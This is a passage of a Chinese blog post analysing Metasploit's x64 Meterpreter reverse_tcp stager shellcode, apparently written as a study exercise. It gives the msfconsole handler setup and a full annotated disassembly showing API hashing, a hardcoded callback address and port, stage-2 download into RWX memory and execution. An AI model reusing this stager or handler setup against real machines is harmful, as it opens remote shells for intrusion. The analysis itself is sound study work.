+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> WSAAPI <span class="token function">connect</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> SOCKET         s<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">const</span> sockaddr <span class="token operator">*</span>name<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span>            namelen
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里有一个有意思的点，即 <code>connect</code> 函数有重试次数的设置。<br>如果超过了重试次数之后还没有连接到服务器，则会直接退出。<br>重试次数被设定为 10 次。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/39.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/40.png"></p>
+<p>启动 msfconsole，<code>use exploits/multi/handler</code>，设置 payload <code>set payload windows/x64/meterpreter/reverse_tcp</code>，设置监听地址 <code>set LHOST 0.0.0.0</code>，设置监听端口 <code>set LPORT 4444</code>。</p>
+<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; show options
+
+Payload options (windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process,
+                                        none)
+   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>建立连接之后就可以准备接收 2 阶段 shellcode 了。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/41.png"><br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/42.png"><br><code>recv</code> 函数的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-recv">定义</a>如下。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> WSAAPI <span class="token function">recv</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>  SOCKET s<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>out<span class="token punctuation">]</span> <span class="token keyword">char</span>   <span class="token operator">*</span>buf<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>  <span class="token keyword">int</span>    len<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>  <span class="token keyword">int</span>    flags
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先接收了 4 个字节确认接下来要接收的 shellcode 长度，<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/46.png"></p>
+<p>然后调用 <code>VirtualAlloc</code> 分配了 0x31c46 字节大小的空间，权限是 <code>PAGE_EXECUTE_READWRITE</code>，即 rwx。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/43.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">jmp rax called: rax&#x3D;76FB5980, arg1&#x3D;0, arg2&#x3D;31C46, arg3&#x3D;1000, arg4&#x3D;40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">定义</a>如下。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">LPVOID <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> LPVOID lpAddress<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           SIZE_T dwSize<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           DWORD  flAllocationType<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           DWORD  flProtect
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>随后继续接收 shellcode，会存放到这片内存区域。<br>在 <code>rsi</code> 中存放了有关 shellcode 大小的内容，每次接收之后都会用来减去接收到的长度，等于 0 时代表接收完毕，<code>jmp r15</code> 跳转到 rwx 区域继续执行 2 阶段 shellcode。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/44.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/45.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>学习到了 <code>call/jmp</code> 的配合，即利用库函数的 <code>ret</code> 实现地址的返回，减少开销。</li>
+<li>学习到了有关 stager shellcode 的基本内容，即通过 <code>ws2_32</code> 建立通信。</li>
+<li>加深了对通过 LDR 链表进行函数查找的理解。</li>
+</ul>
+<p>虽然标题写着是 <code>part 1</code>，但是 2 阶段的 shellcode 内容实在是有点多，有点分析不下去（还是要看官方仓库源码）。<br>而且在动态调试的时候，一旦停了下来，就会被 metasploit 自动关闭连接，还没有找到办法解决这个问题，非常难受。</p>
+<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; run
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Sending stage (203846 bytes) to 192.168.238.129
+[-] Meterpreter session 3 is not valid and will be closed
+[*] 192.168.238.129 - Meterpreter session 3 closed.
+[*] Sending stage (203846 bytes) to 192.168.238.129
+[-] Meterpreter session 4 is not valid and will be closed
+[*] 192.168.238.129 - Meterpreter session 4 closed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="（分析内容-汇编存档）"><a href="#（分析内容-汇编存档）" class="headerlink" title="（分析内容&#x2F;汇编存档）"></a>（分析内容&#x2F;汇编存档）</h1><pre class="line-numbers language-none"><code class="language-none">00000000FFD03570  | FC                   | cld                            | 清除 df 标志位
+00000000FFD03571  | 48:83E4 F0           | and rsp,FFFFFFFFFFFFFFF0       | 栈对齐
+00000000FFD03575  | E8 CC000000          | call notepad.FFD03646          | 将接下来的 shellcode 地址放到栈上
+00000000FFD0357A  | 41:51                | push r9                        | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD0357C  | 41:50                | push r8                        |
+00000000FFD0357E  | 52                   | push rdx                       |
+00000000FFD0357F  | 48:31D2              | xor rdx,rdx                    |
+00000000FFD03582  | 6548:8B52 60         | mov rdx,qword ptr gs:[rdx+60]  |
+00000000FFD03587  | 51                   | push rcx                       |
+00000000FFD03588  | 56                   | push rsi                       |
+00000000FFD03589  | 48:8B52 18           | mov rdx,qword ptr ds:[rdx+18]  | rdx &#x3D; ldr
+00000000FFD0358D  | 48:8B52 20           | mov rdx,qword ptr ds:[rdx+20]  | rdx &#x3D; InMemoryOrderModuleList 结点
+00000000FFD03591  | 48:0FB74A 4A         | movzx rcx,word ptr ds:[rdx+4A] | BaseDllName-&gt;MaximumLength（因为是 InMemoryOrder，此时 rdx 在 +0x10 的位置）
+00000000FFD03596  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD03599  | 48:8B72 50           | mov rsi,qword ptr ds:[rdx+50]  | BaseDllName-&gt;Buffer
+00000000FFD0359D  | 48:31C0              | xor rax,rax                    | 清空rax
+00000000FFD035A0  | AC                   | lodsb                          | ds:si -&gt; al，将 buffer内容写到 al
+00000000FFD035A1  | 3C 61                | cmp al,61                      | 61:&#39;a&#39;
+00000000FFD035A3  | 7C 02                | jl notepad.FFD035A7            | 将小写转为大写（此处默认所有内容均为英文字符？）
+00000000FFD035A5  | 2C 20                | sub al,20                      |
+00000000FFD035A7  | 41:C1C9 0D           | ror r9d,D                      | r9 记录 dll 变换 hash
+00000000FFD035AB  | 41:01C1              | add r9d,eax                    | 将字符内容加到 r9 上
+00000000FFD035AE  | E2 ED                | loop notepad.FFD0359D          | 0b0h - 9dh &#x3D; 19，0edh 是有符号数，-19
+00000000FFD035B0  | 52                   | push rdx                       |
+00000000FFD035B1  | 41:51                | push r9                        | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD035B3  | 48:8B52 20           | mov rdx,qword ptr ds:[rdx+20]  | DllBase
+00000000FFD035B7  | 8B42 3C              | mov eax,dword ptr ds:[rdx+3C]  | e_lfanew
+00000000FFD035BA  | 48:01D0              | add rax,rdx                    | 定位到_IMAGE_NT_HEADERS
+00000000FFD035BD  | 66:8178 18 0B02      | cmp word ptr ds:[rax+18],20B   | 判断程序位数，x86 &#x3D; 0x10b，x64 &#x3D; 0x20b
+00000000FFD035C3  | 0F85 72000000        | jne notepad.FFD0363B           |
+00000000FFD035C9  | 8B80 88000000        | mov eax,dword ptr ds:[rax+88]  | 获取导出表 rva
+00000000FFD035CF  | 48:85C0              | test rax,rax                   | 检查是否存在导出表
+00000000FFD035D2  | 74 67                | je notepad.FFD0363B            |
+00000000FFD035D4  | 48:01D0              | add rax,rdx                    | 跳转到导出表对应指针
+00000000FFD035D7  | 50                   | push rax                       |
+00000000FFD035D8  | 44:8B40 20           | mov r8d,dword ptr ds:[rax+20]  | AddressOfNames
+00000000FFD035DC  | 49:01D0              | add r8,rdx                     |
+00000000FFD035DF  | 8B48 18              | mov ecx,dword ptr ds:[rax+18]  | NumberOfNames
+00000000FFD035E2  | E3 56                | jrcxz notepad.FFD0363A         | 检查 rcx,&#x3D;0 时跳出
+00000000FFD035E4  | 4D:31C9              | xor r9,r9                      | 计算 hash
+00000000FFD035E7  | 48:FFC9              | dec rcx                        | size - 1
+00000000FFD035EA  | 41:8B3488            | mov esi,dword ptr ds:[r8+rcx*4 |
+00000000FFD035EE  | 48:01D6              | add rsi,rdx                    |
+00000000FFD035F1  | 48:31C0              | xor rax,rax                    |
+00000000FFD035F4  | AC                   | lodsb                          |
+00000000FFD035F5  | 41:C1C9 0D           | ror r9d,D                      | r9d:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD035F9  | 41:01C1              | add r9d,eax                    | r9d:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD035FC  | 38E0                 | cmp al,ah                      |
+00000000FFD035FE  | 75 F1                | jne notepad.FFD035F1           | 到达字符串末尾时是空字符
+00000000FFD03600  | 4C:034C24 08         | add r9,qword ptr ss:[rsp+8]    | rsp + 8 是 dll hash
+00000000FFD03605  | 45:39D1              | cmp r9d,r10d                   | 比较函数哈希
+00000000FFD03608  | 75 D8                | jne notepad.FFD035E2           |
+00000000FFD0360A  | 58                   | pop rax                        | pop 导出表
+00000000FFD0360B  | 44:8B40 24           | mov r8d,dword ptr ds:[rax+24]  | r8d &#x3D; AddressOfNameOrdinals
+00000000FFD0360F  | 49:01D0              | add r8,rdx                     | 跳转到 AddressOfNameOrdinals
+00000000FFD03612  | 6641:8B0C48          | mov cx,word ptr ds:[r8+rcx*2]  | 通过索引来找到 Ordinals，注意每一个 ordinals 都是 short
+00000000FFD03617  | 44:8B40 1C           | mov r8d,dword ptr ds:[rax+1C]  | r8d &#x3D; AddressOfFunctions
+00000000FFD0361B  | 49:01D0              | add r8,rdx                     | 跳转到 AddressOfFunctions
+00000000FFD0361E  | 41:8B0488            | mov eax,dword ptr ds:[r8+rcx*4 | eax &#x3D; 函数地址，注意每一个地址 4 字节 rva
+00000000FFD03622  | 48:01D0              | add rax,rdx                    | 函数地址 &#x3D; rva + 当前 dll 地址
+00000000FFD03625  | 41:58                | pop r8                         |
+00000000FFD03627  | 41:58                | pop r8                         | 当前 ldr 结点
+00000000FFD03629  | 5E                   | pop rsi                        | 恢复栈
+00000000FFD0362A  | 59                   | pop rcx                        | 传参
+00000000FFD0362B  | 5A                   | pop rdx                        | 传参
+00000000FFD0362C  | 41:58                | pop r8                         | 传参
+00000000FFD0362E  | 41:59                | pop r9                         | 传参
+00000000FFD03630  | 41:5A                | pop r10                        |
+00000000FFD03632  | 48:83EC 20           | sub rsp,20                     |
+00000000FFD03636  | 41:52                | push r10                       | rcx rdx r8 r9。调用指定的函数
+00000000FFD03638  | FFE0                 | jmp rax                        | 调用指定函数。因为 push r10，所以 ret 时跳到此处 +0x42
+00000000FFD0363A  | 58                   | pop rax                        | pop 导出表
+00000000FFD0363B  | 41:59                | pop r9                         | pop dll 名称变换的哈希
+00000000FFD0363D  | 5A                   | pop rdx                        | pop 当前 _LDR_DATA_TABLE_ENTRY 结点
+00000000FFD0363E  | 48:8B12              | mov rdx,qword ptr ds:[rdx]     | 转到下一个 InMemoryOrderLinks
+00000000FFD03641  | E9 4BFFFFFF          | jmp notepad.FFD03591           | dllname hash，检查位数，计算函数名 hash +dllhash
+00000000FFD03646  | 5D                   | pop rbp                        | 将 shellcode 地址放到 rbp
+00000000FFD03647  | 49:BE 7773325F333200 | mov r14,32335F327377           | ws2_32 字符串
+00000000FFD03651  | 41:56                | push r14                       |
+00000000FFD03653  | 49:89E6              | mov r14,rsp                    |
+00000000FFD03656  | 48:81EC A0010000     | sub rsp,1A0                    |
+00000000FFD0365D  | 49:89E5              | mov r13,rsp                    |
+00000000FFD03660  | 49:BC 0200115CC0A8EE | mov r12,82EEA8C05C110002       | sockaddr_in，sin_family 小端 0002h，sin_port 大端 115c
+00000000FFD0366A  | 41:54                | push r12                       | sin_addr 大端
+00000000FFD0366C  | 49:89E4              | mov r12,rsp                    |
+00000000FFD0366F  | 4C:89F1              | mov rcx,r14                    |
+00000000FFD03672  | 41:BA 4C772607       | mov r10d,726774C               | 目标 hash，为 LoadLibraryA
+00000000FFD03678  | FFD5                 | call rbp                       | 计算 hash
+00000000FFD0367A  | 4C:89EA              | mov rdx,r13                    | 返回自 jmp rax（LoadLibraryA），此处 r13 &#x3D; 栈空间
+00000000FFD0367D  | 68 01010000          | push 101                       |
+00000000FFD03682  | 59                   | pop rcx                        |
+00000000FFD03683  | 41:BA 29806B00       | mov r10d,6B8029                | 目标 hash，为 WSAStartup
+00000000FFD03689  | FFD5                 | call rbp                       | 计算 hash
+00000000FFD0368B  | 6A 0A                | push A                         | 返回自 jmp rax（）
+00000000FFD0368D  | 41:5E                | pop r14                        |
+00000000FFD0368F  | 50                   | push rax                       |
+00000000FFD03690  | 50                   | push rax                       |
+00000000FFD03691  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD03694  | 4D:31C0              | xor r8,r8                      |
+00000000FFD03697  | 48:FFC0              | inc rax                        |
+00000000FFD0369A  | 48:89C2              | mov rdx,rax                    |
+00000000FFD0369D  | 48:FFC0              | inc rax                        |
+00000000FFD036A0  | 48:89C1              | mov rcx,rax                    |
+00000000FFD036A3  | 41:BA EA0FDFE0       | mov r10d,E0DF0FEA              | 目标 hash，为 WSASocketA
+00000000FFD036A9  | FFD5                 | call rbp                       | 计算自 hash
+00000000FFD036AB  | 48:89C7              | mov rdi,rax                    | 返回自 jmp rax
+00000000FFD036AE  | 6A 10                | push 10                        |
+00000000FFD036B0  | 41:58                | pop r8                         |
+00000000FFD036B2  | 4C:89E2              | mov rdx,r12                    |
+00000000FFD036B5  | 48:89F9              | mov rcx,rdi                    |
+00000000FFD036B8  | 41:BA 99A57461       | mov r10d,6174A599              | 目标 hash，为 connect
+00000000FFD036BE  | FFD5                 | call rbp                       |
+00000000FFD036C0  | 85C0                 | test eax,eax                   | 连接失败时，eax&#x3D;0FFFFFFFFh
+00000000FFD036C2  | 74 0A                | je notepad.FFD036CE            |
+00000000FFD036C4  | 49:FFCE              | dec r14                        | 重试次数
+00000000FFD036C7  | 75 E5                | jne notepad.FFD036AE           |
+00000000FFD036C9  | E8 93000000          | call notepad.FFD03761          | ntdll.RtlExitUserProcess
+00000000FFD036CE  | 48:83EC 10           | sub rsp,10                     |
+00000000FFD036D2  | 48:89E2              | mov rdx,rsp                    |
+00000000FFD036D5  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD036D8  | 6A 04                | push 4                         |
+00000000FFD036DA  | 41:58                | pop r8                         |
+00000000FFD036DC  | 48:89F9              | mov rcx,rdi                    |
+00000000FFD036DF  | 41:BA 02D9C85F       | mov r10d,5FC8D902              | hash &#x3D; recv
+00000000FFD036E5  | FFD5                 | call rbp                       | 准备接收 2 阶段 shellcode
+00000000FFD036E7  | 83F8 00              | cmp eax,0                      |
+00000000FFD036EA  | 7E 55                | jle notepad.FFD03741           |
+00000000FFD036EC  | 48:83C4 20           | add rsp,20                     |
+00000000FFD036F0  | 5E                   | pop rsi                        |
+00000000FFD036F1  | 89F6                 | mov esi,esi                    |
+00000000FFD036F3  | 6A 40                | push 40                        |
+00000000FFD036F5  | 41:59                | pop r9                         | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD036F7  | 68 00100000          | push 1000                      |
+00000000FFD036FC  | 41:58                | pop r8                         |
+00000000FFD036FE  | 48:89F2              | mov rdx,rsi                    |
+00000000FFD03701  | 48:31C9              | xor rcx,rcx                    |
+00000000FFD03704  | 41:BA 58A453E5       | mov r10d,E553A458              | VirtualAlloc
+00000000FFD0370A  | FFD5                 | call rbp                       |
+00000000FFD0370C  | 48:89C3              | mov rbx,rax                    | 在此处应该可以看到 rax 为分配的 rwx 空间
+00000000FFD0370F  | 49:89C7              | mov r15,rax                    | r15 &#x3D; rax
+00000000FFD03712  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD03715  | 49:89F0              | mov r8,rsi                     |
+00000000FFD03718  | 48:89DA              | mov rdx,rbx                    |
+00000000FFD0371B  | 48:89F9              | mov rcx,rdi                    |
+00000000FFD0371E  | 41:BA 02D9C85F       | mov r10d,5FC8D902              | recv
+00000000FFD03724  | FFD5                 | call rbp                       |
+00000000FFD03726  | 83F8 00              | cmp eax,0                      |
+00000000FFD03729  | 7D 28                | jge notepad.FFD03753           |
+00000000FFD0372B  | 58                   | pop rax                        |
+00000000FFD0372C  | 41:57                | push r15                       |
+00000000FFD0372E  | 59                   | pop rcx                        |
+00000000FFD0372F  | 68 00400000          | push 4000                      |
+00000000FFD03734  | 41:58                | pop r8                         |
+00000000FFD03736  | 6A 00                | push 0                         |
+00000000FFD03738  | 5A                   | pop rdx                        |
+00000000FFD03739  | 41:BA 0B2F0F30       | mov r10d,300F2F0B              |
+00000000FFD0373F  | FFD5                 | call rbp                       |
+00000000FFD03741  | 57                   | push rdi                       |
+00000000FFD03742  | 59                   | pop rcx                        |
+00000000FFD03743  | 41:BA 756E4D61       | mov r10d,614D6E75              |
+00000000FFD03749  | FFD5                 | call rbp                       |
+00000000FFD0374B  | 49:FFCE              | dec r14                        |
+00000000FFD0374E  | E9 3CFFFFFF          | jmp notepad.FFD0368F           |
+00000000FFD03753  | 48:01C3              | add rbx,rax                    |
+00000000FFD03756  | 48:29C6              | sub rsi,rax                    | rsi 为接收 shellcode 的目标总长度
+00000000FFD03759  | 48:85F6              | test rsi,rsi                   | 接收的 shellcode 大小
+00000000FFD0375C  | 75 B4                | jne notepad.FFD03712           |
+00000000FFD0375E  | 41:FFE7              | jmp r15                        | 执行 shellcode
+00000000FFD03761  | 58                   | pop rax                        |
+00000000FFD03762  | 6A 00                | push 0                         |
+00000000FFD03764  | 59                   | pop rcx                        |
+00000000FFD03765  | 49:C7C2 F0B5A256     | mov r10,56A2B5F0               |
+00000000FFD0376C  | FFD5                 | call rbp                       |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+    </div>
+  </div>
+
+  
+    
+  <div class="sea-prev-next-wrapper">
+    
+    
+      <div class="next">
+        <a class="link" href="/2026/09/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-babymqtt/">
+          强网杯2025车联网赛道-babymqtt
+        </a>
+        <svg t="1725418993065" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="6832" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M731.733333 480l-384-341.333333c-17.066667-14.933333-44.8-14.933333-59.733333 4.266666-14.933333 17.066667-14.933333 44.8 4.266667 59.733334L640 512 292.266667 821.333333c-17.066667 14.933333-19.2 42.666667-4.266667 59.733334 8.533333 8.533333 19.2 14.933333 32 14.933333 10.666667 0 19.2-4.266667 27.733333-10.666667l384-341.333333c8.533333-8.533333 14.933333-19.2 14.933334-32s-4.266667-23.466667-14.933334-32z" p-id="6833"></path></svg>
+      </div>
+    
+  </div>
+
+  
+</article>
+
+
+
+<script defer>
+  document.addEventListener('DOMContentLoaded', function () {
+    const toggleIcon = document.querySelector('.sea-article-catalog-title .sea-svg-icon');
+    const tocContent = document.querySelector('.sea-article-catalog > .toc');
+    if (toggleIcon && tocContent) {
+      toggleIcon.addEventListener('click', function () {
+        tocContent.classList.toggle('sea-article-catalog-show');
+        toggleIcon.classList.toggle('sea-svg-icon-rotate');
+      });
+    }
+  });
+</script>
+  </main>
+  <footer id="sea-footer-container">
+  <div class="sea-footer-row">
+    <div class="sea-footer-menu-link">
+      
+        <a
+          class="sea-footer-link"
+          
+            target="_blank"
+          
+          href="https://github.com/shanzade"
+        >
+          GitHub
+        </a>
+        <span class="sea-footer-link__dot">·</span>
+      
+    </div>
+  </div>
+  
+  
+  
+  <div class="sea-footer-row">
+    <div class="sea-footer-copyright">
+      <span>©</span>
+      
+        2026
+      
+      <span>·</span>
+      shanza
+    </div>
+    <span class="split-line">|</span>
+    <div class="sea-footer-theme-by">
+      Theme by <a class="theme" href="https://github.com/hai-zou/hexo-theme-sea" target="_blank">Sea</a>
+    </div>
+  </div>
+</footer>
+
+  
+
+
+<script src="/js/main.js" defer></script>
+
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
